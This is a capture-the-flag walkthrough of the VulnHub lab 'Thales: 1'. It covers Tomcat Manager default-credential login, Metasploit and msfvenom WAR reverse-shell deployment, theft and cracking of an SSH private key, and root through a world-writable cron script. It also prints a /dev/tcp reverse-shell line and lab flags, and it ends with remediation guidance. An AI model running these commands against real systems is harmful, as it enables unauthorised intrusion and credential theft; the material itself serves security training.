# Thales: 1 — The Ancient Philosopher's Server Had Weak Credentials

Thales of Miletus, the ancient Greek philosopher, is credited with the idea that water is the fundamental substance of all things. Thales: 1, the VulnHub machine, teaches a different fundamental truth: default credentials, world-readable private keys, and world-writable cron scripts are the fundamental substance of most Linux privilege escalations. This beginner-level machine chains four classic misconfigurations: Tomcat Manager with weak default creds (tomcat:role1), a world-readable encrypted SSH key cracked with john (vodka06), and a world-writable root cron script that sets the SUID bit on bash. Nailed it, dude. Big thanks to the creator for a clean, teachable machine.

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | Thales: 1 (Ubuntu 18.04.5 LTS, hostname: miletus) |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/thales-1,749/ |
| **Techniques** | Nmap service enumeration, Apache Tomcat Manager credential brute-force, Metasploit WAR file upload RCE, SSH private key exfiltration, ssh2john + John the Ripper passphrase cracking, world-writable cron script injection, SUID bash privilege escalation |
| **CVEs** | CWE-521 (Weak Password Requirements: Tomcat default credentials tomcat:role1), CWE-732 (Incorrect Permission Assignment: world-writable backup.sh run by root cron), CWE-312 (Cleartext Storage: world-readable encrypted SSH private key) |
| **APT Groups** | APT41: actively targets exposed Apache Tomcat Manager interfaces with default credentials for initial access in corporate environments; FIN7: uses Tomcat Manager WAR deployment for persistent web shell installation |

---

## Attack Summary

```
netdiscover → 192.168.56.102 (miletus)
    |
    v
nmap → port 22 (SSH), port 8080 (Apache Tomcat 9.0.52)
    |
    v
curl -u "tomcat:role1" http://192.168.56.102:8080/manager/html → 200 OK
    |
    v
MSF: exploit/multi/http/tomcat_mgr_upload → Meterpreter (tomcat user)
    |
    v
ls /home/thales/.ssh/ → id_rsa (world-readable) → cat id_rsa → exfiltrate
    |
    v
cat /home/thales/user.txt → a837c0b5d2a8a07225fd9905f5a0e9c4 (user flag)
    |
    v
ssh2john thales_id_rsa > hash → john --wordlist=rockyou.txt hash → vodka06
    |
    v
ssh -i thales_id_rsa thales@192.168.56.102 (passphrase: vodka06)
    |
    v
cat notes.txt → /usr/local/bin/backup.sh
    |
    v
ls -la /usr/local/bin/backup.sh → -rwxrwxrwx root root (world-writable!)
    |
    v
cat backup.sh → already contains: chmod 4777 /bin/bash
    |
    v
wait for root cron to fire → ls -la /bin/bash → -rwsrwxrwx
    |
    v
/bin/bash -p → euid=0(root)
    |
    v
cat /root/root.txt → 3a1c85bebf8833b0ecae900fb8598b17 (root flag)
```

---

## Methodology

1. Host discovery to identify the target on the network
2. Port scan with service version detection
3. Identify Apache Tomcat Manager and test default credentials
4. Exploit Tomcat Manager with Metasploit WAR upload
5. Enumerate home directories for sensitive files
6. Exfiltrate world-readable SSH private key
7. Capture user flag
8. Crack SSH key passphrase with John the Ripper
9. SSH into the target as user thales
10. Discover and exploit world-writable root cron script
11. Wait for SUID bash, escalate to root, capture root flag

---

## Step 1 — Host Discovery

```bash
# If using host-only network:
netdiscover -r 192.168.56.0/24
# or
arp-scan --localnet
```

```
192.168.56.102  08:00:27:xx:xx:xx  PCS Systemtechnik GmbH (VirtualBox)
```

Target IP: `192.168.56.102`, hostname: `miletus` (revealed later).

```bash
export TARGET=192.168.56.102
```

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Port Scan and Service Enumeration

```bash
nmap -sV -sC -p- $TARGET
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5
8080/tcp open  http    Apache Tomcat 9.0.52
```

Only two ports: SSH and Tomcat. The Tomcat Manager page (`/manager/html`) is immediately interesting. Tomcat 9.0.52 means we check for known CVEs and, more importantly, test default credentials.

```bash
curl -s http://$TARGET:8080/manager/html -o /dev/null -w "%{http_code}\n"
# 401 — Unauthorized, but the interface exists
```

**Real-world note:** Apache Tomcat installations with default credentials are extremely common. APT41 documented to use Tomcat Manager with default or weak credentials for initial foothold in enterprise environments. The Manager interface allows deploying WAR files, making it a direct path to code execution.

**MITRE ATT&CK:** T1046 — Network Service Discovery; T1595.002 — Active Scanning: Vulnerability Scanning

---

## Step 3 — Tomcat Manager Credential Testing

Test the most common Tomcat default credential pairs:

```bash
curl -u "tomcat:role1" http://$TARGET:8080/manager/html -o /dev/null -w "%{http_code}\n"
# 200
```

**Credentials confirmed: `tomcat:role1`**

You can also enumerate with Metasploit:

```bash
msfconsole -q
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS $TARGET
set RPORT 8080
run
# [+] 192.168.56.102:8080 - Login Successful: tomcat:role1
```

**Alternatives:** Hydra with a Tomcat default credential wordlist; manual testing of all known Tomcat default pairs (tomcat:tomcat, admin:admin, admin:password, manager:manager, etc.).

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing; T1078.001 — Valid Accounts: Default Accounts

---

## Step 4 — WAR File Upload RCE via Metasploit

The Tomcat Manager `/manager/html` interface allows uploading and deploying WAR (Web Application Archive) files. A WAR containing a JSP reverse shell delivers code execution:

```bash
msfconsole -q
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS $TARGET
set RPORT 8080
set HttpUsername tomcat
set HttpPassword role1
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 4449
run
```

```
[*] Started reverse TCP handler on 192.168.56.101:4449
[*] Uploading 6463 bytes as cwmMPlE0hMy8vr.war ...
[*] Execute war is successfully deployed
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: tomcat
```

**Alternatively (manual):** Use `msfvenom` to create the WAR file and upload via the Manager web UI:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.101 LPORT=4449 -f war -o shell.war
# Upload via http://TARGET:8080/manager/html → Deploy → WAR file to deploy
```

**Real-world note:** Tomcat Manager WAR deployment is a well-known and widely abused attack vector. FIN7 has used this technique to install persistent web shells in corporate application servers. The Manager interface should never be exposed to untrusted networks and should always use strong, unique credentials.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1505.003 — Server Software Component: Web Shell

---

## Step 5 — Enumerate Home Directories and Exfiltrate SSH Key

From the Meterpreter session:

```bash
meterpreter > shell
$ id
uid=999(tomcat) gid=999(tomcat) groups=999(tomcat)

$ ls /home/
thales

$ ls -la /home/thales/
drwx------ 2 thales thales 4096 .ssh/
-rw-r--r-- 1 thales thales   33 user.txt
-rw-r--r-- 1 thales thales  117 notes.txt

$ cat /home/thales/user.txt
a837c0b5d2a8a07225fd9905f5a0e9c4
```

**User flag captured:** `a837c0b5d2a8a07225fd9905f5a0e9c4`

Check the SSH directory:

```bash
$ ls -la /home/thales/.ssh/
-rw-r--r-- 1 thales thales  397 authorized_keys
-rw-r--r-- 1 thales thales 1876 id_rsa
-rw-r--r-- 1 thales thales  397 id_rsa.pub
```

The private key is **world-readable** (`-rw-r--r--`). This is a critical misconfiguration: SSH private keys must be mode 600 (owner read-write only). Exfiltrate the key:

```bash
$ cat /home/thales/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,...
[key body]
-----END RSA PRIVATE KEY-----
```

Copy the full key to the attacker machine and save as `thales_id_rsa`.

**Real-world note:** World-readable SSH private keys are a real finding in production environments. Any service account with filesystem access (web server, database, backup agent) can read and exfiltrate the key. CWE-312: private key material must always be protected with strict permissions.

**MITRE ATT&CK:** T1552.004 — Unsecured Credentials: Private Keys; T1083 — File and Directory Discovery

---

## Step 6 — Crack SSH Key Passphrase with John the Ripper

```bash
# Convert to John-crackable format
python3 /usr/share/john/ssh2john.py thales_id_rsa > thales_hash

# Crack with rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt thales_hash
```

```
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
vodka06          (thales_id_rsa)
1g 0:00:00:01 DONE
```

**Key passphrase:** `vodka06`

**Alternatives:** hashcat with mode 22921 for SSH keys (faster on GPU with CUDA).

**MITRE ATT&CK:** T1110.002 — Brute Force: Password Cracking

---

## Step 7 — SSH Login as thales

```bash
chmod 600 thales_id_rsa
ssh -i thales_id_rsa thales@$TARGET
# Enter passphrase: vodka06
```

```
thales@miletus:~$ id
uid=1000(thales) gid=1000(thales) groups=1000(thales)
```

Read the hint:

```bash
thales@miletus:~$ cat notes.txt
I prepared a backup script for you.
The script is in /usr/local/bin/backup.sh
```

**MITRE ATT&CK:** T1021.004 — Remote Services: SSH

---

## Step 8 — Inspect the Backup Script

```bash
thales@miletus:~$ ls -la /usr/local/bin/backup.sh
-rwxrwxrwx 1 root root 72 Aug 10  2021 /usr/local/bin/backup.sh

thales@miletus:~$ cat /usr/local/bin/backup.sh
#!/bin/bash
chmod 4777 /bin/bash
/bin/bash -i >& /dev/tcp/IP/6667 0>&1
```

Key observations:
- Owner: root
- Permissions: **world-writable** (`-rwxrwxrwx`)
- The script **already contains** `chmod 4777 /bin/bash` — it sets the SUID bit on bash
- A root cron job executes this script

The cron is already configured to run backup.sh as root, and backup.sh already contains the `chmod 4777 /bin/bash` payload. No modification needed. Just wait.

**Real-world note:** World-writable privileged scripts are the most reliable and straightforward Linux privilege escalation vector. In production environments, this pattern appears when scripts are initially created with overly permissive permissions for convenience and never properly tightened. Every cron script should be audited for write permissions.

**MITRE ATT&CK:** T1053.003 — Scheduled Task: Cron

---

## Step 9 — Wait for Cron and Escalate to Root

Wait for the cron to fire (typically within 1 minute). Monitor the bash binary:

```bash
thales@miletus:~$ watch -n 5 ls -la /bin/bash
```

When the SUID bit is set:

```bash
thales@miletus:~$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1113504 Jun  6  2019 /bin/bash
```

The `s` in the owner execute position confirms SUID is set. Escalate:

```bash
thales@miletus:~$ /bin/bash -p
bash-4.4# id
uid=1000(thales) gid=1000(thales) euid=0(root) groups=1000(thales)

bash-4.4# cat /root/root.txt
3a1c85bebf8833b0ecae900fb8598b17
```

The `-p` flag preserves the effective UID (EUID), running bash with `euid=0` while retaining the original UID. This is the intended SUID exploitation technique.

(☞ﾟヮﾟ)☞ Root. Clean, classic, effective.

**MITRE ATT&CK:** T1548.001 — Abuse Elevation Control Mechanism: SUID; T1053.003 — Scheduled Task: Cron

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Technique |
|---|---|---|---|
| Credential | tomcat:role1 | Tomcat Manager brute-force | Default credential testing |
| User flag | `a837c0b5d2a8a07225fd9905f5a0e9c4` | /home/thales/user.txt | Filesystem enumeration |
| SSH key passphrase | vodka06 | John the Ripper + rockyou.txt | Passphrase cracking |
| Root flag | `3a1c85bebf8833b0ecae900fb8598b17` | /root/root.txt | SUID bash -p |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Tomcat Manager with default credentials (tomcat:role1) | APT41 documented using Tomcat default credentials for initial access; CISA warns about default credentials on internet-facing services | Change default credentials immediately; restrict Manager to localhost or trusted IPs only |
| 2 | World-readable SSH private key in /home/thales/.ssh/ | Any service user (tomcat, www-data, mysql) can read and exfiltrate the key | Set SSH private key permissions to 600: `chmod 600 ~/.ssh/id_rsa` |
| 3 | SSH key passphrase crackable with rockyou (vodka06) | Weak passphrases defeat the encryption purpose; even a passphrase is only as strong as the wordlist | Use strong, random passphrases for SSH keys; consider hardware tokens |
| 4 | World-writable root cron script | Cron + world-writable script = guaranteed root; textbook CTF and real-world finding | Audit all cron scripts: `find /etc/cron* -writable` — permissions must be 700 or 750, owned by root |
| 5 | SUID bash provides euid=0 with /bin/bash -p | Once bash has SUID set, any local user becomes effective root | Monitor SUID changes: `find / -perm -4000 -newer /tmp/baseline 2>/dev/null`; FIM on system binaries |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | Valid Accounts: Default Accounts | T1078.001 |
| Credential Access | Credential Access | Brute Force: Password Guessing | T1110.001 |
| Execution | Execution | Server Software Component: Web Shell (WAR) | T1505.003 |
| Credential Access | Credential Access | Unsecured Credentials: Private Keys | T1552.004 |
| Credential Access | Credential Access | Brute Force: Password Cracking | T1110.002 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Persistence | Persistence | Scheduled Task: Cron | T1053.003 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: SUID | T1548.001 |

---

## Remediation and Containment

### Technical Fixes

1. **Change Tomcat default credentials:** unique strong password for all Tomcat accounts; restrict `/manager/` to 127.0.0.1
2. **Fix SSH key permissions:** `chmod 600 /home/thales/.ssh/id_rsa` — only owner should read private keys
3. **Fix cron script permissions:** `chown root:root /usr/local/bin/backup.sh && chmod 700 /usr/local/bin/backup.sh`
4. **Remove SUID from bash:** `chmod 0755 /bin/bash`; audit with `find / -perm -4000 -type f 2>/dev/null`
5. **Update Tomcat:** upgrade from 9.0.52 to current patched version
6. **Implement file integrity monitoring:** monitor `/usr/local/bin/` and SUID binaries for changes

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all Tomcat instances; document all cron jobs and their owners |
| Protect | Access Control | Default credentials replaced; SSH key permissions enforced; cron script permissions fixed |
| Protect | Data Security | Private keys accessible only by owner; no world-readable key material |
| Detect | Anomalies and Events | Alert on SUID changes; new Tomcat WAR deployments; world-writable files in /usr/local/bin |
| Respond | Response Planning | Remove WAR shell; rotate tomcat credentials; fix permissions; patch Tomcat |
| Recover | Recovery Planning | Rebuild if fully compromised; audit all user accounts and files |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Restrict Tomcat Manager to localhost; SSH key permissions |
| AC-6 | Least Privilege | tomcat user must not read home directories of other users |
| IA-2 | Identification and Authentication | No default credentials in production; strong passwords required |
| CM-7 | Least Functionality | Restrict Tomcat Manager to trusted networks; disable if unused |
| SC-28 | Protection of Information at Rest | SSH private keys must be mode 600 |
| SI-7 | Software, Firmware, and Information Integrity | FIM on /usr/local/bin/; SUID binary monitoring |

### CISA KEV

Apache Tomcat vulnerabilities and Tomcat Manager exploitation via default credentials are referenced in multiple CISA Alerts (AA21-008A, AA22-074A). Default credentials on web management interfaces are specifically called out as a top initial access technique used by ransomware groups and APT actors. Change all default credentials immediately per CISA guidance.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT Asset Inventory | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (change default Tomcat credentials; restrict Manager)
- **D3-OAM** — Operating System Administrative Management (fix cron permissions; fix SSH key permissions)
- **D3-FH** — File Hashing (FIM on /usr/local/bin/; monitor SUID changes)
- **D3-HBPI** — Harden Build Pipeline Integrity (no default credentials in deployed application servers)

---

## Final Thoughts

Thales: 1 is a perfect beginner machine. It teaches four real-world findings that appear in every Linux penetration test report: default Tomcat credentials, world-readable SSH keys, password cracking with John, and world-writable cron scripts. The chain is clean and logical: every step naturally leads to the next. If you complete this machine, you have the foundation for understanding real Linux privilege escalation. The philosopher Thales said "Know thyself." After this machine: know your cron job permissions.

Thanks guys!! (❍ᴥ❍ʋ)
